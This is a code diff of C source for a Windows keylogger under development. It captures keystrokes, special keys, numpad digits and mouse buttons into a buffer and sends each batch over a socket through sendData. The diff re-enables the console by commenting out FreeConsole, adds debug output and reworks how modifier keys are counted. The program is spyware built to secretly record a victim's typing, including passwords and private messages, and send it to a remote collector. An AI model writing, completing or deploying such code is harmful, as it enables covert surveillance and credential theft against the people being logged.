@@ -6,9 +6,10 @@ int main(){
 	LPCSTR filename = "logs.txt";
 	// FILE* fp;
 
-	bool flagSpecialKey = false;
+	int flagSpecialKey = 0;
+	bool flagBoolSpecialKey = false;
 
-	FreeConsole();
+	//FreeConsole();
 	int isResult = initSocket();
 
 	if (isResult < 0) {
@@ -37,121 +38,129 @@ int main(){
 
 				case VK_RETURN:
 					strcat(subbuff, " : RETURN\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_TAB:
 					strcat(subbuff, " : TAB\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_BACK:
 					strcat(subbuff, " : BKS\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_CAPITAL:
 					strcat(subbuff, " : CAPS\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_UP:
 					strcat(subbuff, " : UP\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_DOWN:
 					strcat(subbuff, " : DOWN\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_LEFT:
 					strcat(subbuff, " : LEFT\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_RIGHT:
 					strcat(subbuff, " : RIGHT\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_CONTROL:
 					strcat(subbuff, " : CTRL\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
+					flagBoolSpecialKey = true;
 					break;
 				case VK_SHIFT:
 					strcat(subbuff, " : SHIFT\n");
-					flagSpecialKey = true;
+					flagBoolSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_MENU:
 					strcat(subbuff, " : ALT\n");
-					flagSpecialKey = true;
+					flagBoolSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD0:
 					strcat(subbuff, " : 0\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD1:
 					strcat(subbuff, " : 1\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD2:
 					strcat(subbuff, " : 2\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD3:
 					strcat(subbuff, " : 3\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD4:
 					strcat(subbuff, " : 4\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD5:
 					strcat(subbuff, " : 5\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD6:
 					strcat(subbuff, " : 6\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD7:
 					strcat(subbuff, " : 7\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD8:
 					strcat(subbuff, " : 8\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMPAD9:
 					strcat(subbuff, " : 9\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_NUMLOCK:
 					strcat(subbuff, " : NUMLOCK\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case VK_SPACE:
 					strcat(subbuff, " : SPACE\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case MK_LBUTTON:
 					strcat(subbuff, " : LMB\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				case MK_RBUTTON:
 					strcat(subbuff, " : RMB\n");
-					flagSpecialKey = true;
+					flagSpecialKey++;
 					break;
 				default:
-					if (!flagSpecialKey) {
+					if (flagSpecialKey == 0) 
+						sprintf(subbuff, "%s%s%c\n", subbuff, " : ", i);
+					
+					if(flagBoolSpecialKey){
 
-						sprintf(subbuff, "%s%s%c\n",subbuff, " : ", i);
-						sendData(subbuff);
-
+						printf("*****************\n");
+						flagSpecialKey++;
+						flagBoolSpecialKey = false;
+						printf("%d\n", flagSpecialKey);
 					}
-					else {
-						flagSpecialKey = false;
-					}
+					
 					break;
 				}
 				
-				if (flagSpecialKey) {
+				if (flagSpecialKey != 2) {
 					sendData(subbuff);
-					flagSpecialKey = false;
+					printf("%s", subbuff);
 				}
+
+				if (!flagBoolSpecialKey)
+					flagSpecialKey = 0;
 			}
 		}
 		//fclose(fp);
